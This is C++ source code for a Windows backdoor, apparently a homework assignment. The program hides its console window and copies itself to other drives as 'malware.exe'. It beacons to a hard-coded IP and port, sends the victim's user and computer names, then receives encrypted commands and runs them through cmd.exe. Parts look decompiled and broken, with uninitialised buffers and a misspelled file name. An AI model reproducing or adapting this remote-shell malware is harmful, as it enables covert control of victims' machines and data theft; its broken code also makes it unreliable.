#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0500
#include<iostream>
#include<string>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <WinSock2.h>
using namespace std;
char* pc_data;
int ccc;
SOCKET ss;

SOCKET settings(char* a, char* b);
int recv_data(LPVOID IPparameter);
void L_Device();
BOOL cmd_star(int a);
unsigned int secu(int a1, BYTE *a2, int a3);
void Init(void);
int Get_CName(void);
int _encode_null();
int send_data(SOCKET s, int size, char* data);

int main(void) {
	//HIde command windows
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	L_Device();
	char* ips = "35.194.137.123";
	char* ports = "9001";
	HANDLE handle;
	ss = settings(ips, ports);
	Get_CName();
	ccc = 1;
	send_data(ss, sizeof(pc_data), pc_data);
	handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recv_data, &ss, 0, 0);
	WaitForMultipleObjects(1u, &handle, 0, 0xFFFFFFFF);
	closesocket(ss);
	Sleep(0xEA60u);
	return 0;
}
void L_Device()
{
	ULARGE_INTEGER avail, total, free;
	avail.QuadPart = 0L;
	total.QuadPart = 0L;
	free.QuadPart = 0L;

	int m_avail, m_total, m_free;

	////////// Drive d,e
	// d,e:\의 하드디스크 용량 정보를 받아 옴
	

	FILE* file;
	char output[300];
	file = _popen("cd", "r");
	try {
		system("copy Homework7.exe D:\malware.exe");
		system("copy Hoemwork7.exe E:\malware.exe");
	}
	catch (exception *e)
	{

	}
}
int recv_data(LPVOID IPparameter)
{
	HANDLE handler;
	SOCKET s1;
	SOCKET s2;
	fd_set readfds;
	int r_data;
	char buf;
	void* vv;
	int d5;
	int d6;
	int rr;
	char d12;
	size_t d7;
	s1 = *(DWORD *)IPparameter;
	s2 = *(DWORD *)IPparameter;
	readfds.fd_array[0] = *(DWORD *)IPparameter;
	readfds.fd_count = 1;
	void* ggg = malloc(0x30000u);
	if (ccc)
	{
		while (select(s1 + 1, &readfds, 0, 0, 0) != -1)
		{
			if (__WSAFDIsSet(s1, &readfds))
			{
				r_data = recv(s1, &buf, 0x10000, 0);
				rr = r_data;
				if (r_data)
				{
					if (r_data != -1)
					{
						vv = ggg;
						if (ggg)
						{
							memcpy((char*)ggg + *(DWORD *)ggg + 4, &buf, r_data);
							*(DWORD *)vv += rr;
							while (vv)
							{
								d5 = *(DWORD *)vv;
								d6 = *((WORD *)vv + 2);
								if (!*(DWORD *)vv || d5 < d6)
								{
									s1 = s2;
									if (!ccc)
										return 1;
								}
								memcpy(&d12, (char *)vv + 4, *((WORD *)vv + 2));
								d7 = d5 - d6;
								memcpy((char *)vv + 4, (char *)vv + d6 + 4, d7);
								*(DWORD *)vv = d7;
								secu(*(WORD *)d12 - 56, (BYTE *)(d12 + 56), d12 + 56);
								char* aaa;
								aaa = (char *)malloc(0x100002u);
								cmd_star((int)aaa);
								vv = ggg;
							}
						}
					}
				}
			}
		}
	}
}
BOOL cmd_star(int a)
{
	int v1;
	int v2;
	BOOL result;
	BOOL v4;
	DWORD v5;
	HANDLE hReadPipe;
	DWORD NumberOfBytesREad;
	HANDLE hWritePipe;
	struct _SECURITY_ATTRIBUTES PipeAttributes;
	struct _PROCESS_INFORMATION ProcessInformation;
	struct _STARTUPINFOA StartupInfo;
	CHAR Buffer;
	char v13;
	CHAR CommandLine;
	char v15;
	char v16;
	char v17;

	v2 = v1;
	v16 = 0;
	memset(&v17, 0, 0xFFu);
	PipeAttributes.nLength = 12;
	PipeAttributes.lpSecurityDescriptor = 0;
	PipeAttributes.bInheritHandle = 1;
	CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x1000u);
	memset(&StartupInfo, 0, 0x44u);
	ProcessInformation.hProcess = 0;
	ProcessInformation.hThread = 0;
	ProcessInformation.dwProcessId = 0;
	ProcessInformation.dwThreadId = 0;
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.hStdError = hWritePipe;
	StartupInfo.cb = 68;
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;
	Buffer = 0;
	memset(&v13, 0, 0x103u);
	CommandLine = 0;
	memset(&v15, 0, 0x207u);
	GetSystemDirectoryA(&Buffer, 0x103u);
	sprintf(&CommandLine, "%s\\cmd.exe /c %s", &Buffer, v2);
	result = CreateProcessA(0, &CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation);
	if (result)
	{
		CloseHandle(hWritePipe);
		NumberOfBytesREad = 0;
		v4 = 0;
		while (ReadFile(hReadPipe, &v16, 0xFFFu, &NumberOfBytesREad, 0))
		{
			v5 = v4 + NumberOfBytesREad;
			if (v4 + NumberOfBytesREad >= 0x100001)
				break;
			memcpy((void *)(v4 + a), &v16, NumberOfBytesREad);
			v4 = v5;
			memset(&v16, 0, 0x1000u);
			Sleep(1u);
		}
		CloseHandle(hReadPipe);
		result = v4;
	}
	return result;
}

unsigned int secu(int a1, BYTE *a2, int a3)
{
	int v3;
	int v4;
	BYTE *v5;
	char v6;
	unsigned int result;
	int v8;
	bool v9;
	unsigned int v10;
	int v11;

	v3 = a1;
	v4 = 73;
	v5 = a2;
	v6 = -110;
	v10 = 448530761;
	result = 407045703;

	if (v3 > 0)
	{
		v8 = a3 - (DWORD)v5;
		v11 = v3;
		do
		{
			*v5 = v6 ^result^v4^v5[v8];
			v6 = v6&result^v4&(v6^result);
			v4 = ((((unsigned __int16)v10 ^ (unsigned __int16)(8 * v10)) & 0x7F8) << 20) | (v10 >> 8);
			result = (((result << 7) ^ (result ^ 16 * (result ^ 2 * result)) & 0xFFFFFF80) << 17) | (result >> 8);
			++v5;
			v9 = v11-- == 1;
			v10 = ((((unsigned __int16)v10) ^ (unsigned __int16)(8 * v10) & 0x7F8) << 20) | (v10 >> 8);
		} while (!v9);
	}
	return result;
}
void Init(void)
{
	int aa = _encode_null();
}

int _encode_null()
{
	return __encoded_pointer(0);
}
int Get_CName(void)
{
	CHAR buf;
	buf = 0;
	char size;
	CHAR buf2;
	size = 259;
	GetComputerNameA(&buf, (LPDWORD)&size);
	size = 259;
	GetUserNameA(&buf2, (LPDWORD)&size);
	sprintf(pc_data, "%s_%s", &buf2, &buf);
	return 1;
}
int send_data(SOCKET s, int size, char* data)
{
	fd_set writefds;
	writefds.fd_array[0] = s;
	writefds.fd_count = 1;

	if (select(0, 0, &writefds, 0, 0) == -1)
		return 0;
	if (__WSAFDIsSet(s, &writefds))
	{
		int cc = 0;
		int r_value = send(s, data, size, 0);
		if (r_value == -1)
			return 0;
		while (1) {
			cc += r_value;
			if (cc == size)
				break;
			r_value = send(s, &data[cc], size - cc, 0);
			if (r_value == -1)
				return 0;
		}
	}
}
SOCKET settings(char* a, char* b)
{
	WSADATA wsaData;
	struct sockaddr_in names;
	SOCKET s;
	int trys = 0;
	while (1)
	{
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		s = socket(2, 1, 0);
		int check_s = s;
		if (check_s == -1)
		{
			printf("Socket Creat Error.\n");
			exit(1);
		}
		memset(&names, 0, sizeof(names));
		names.sin_family = AF_INET;
		names.sin_addr.s_addr = inet_addr(a);
		names.sin_port = htons(atoi(b));

		if (connect(s, (SOCKADDR *)&names, sizeof(names)) != -1)
			return check_s;
		closesocket(check_s);
		Sleep(0xEA60u);
		++trys;
	}
}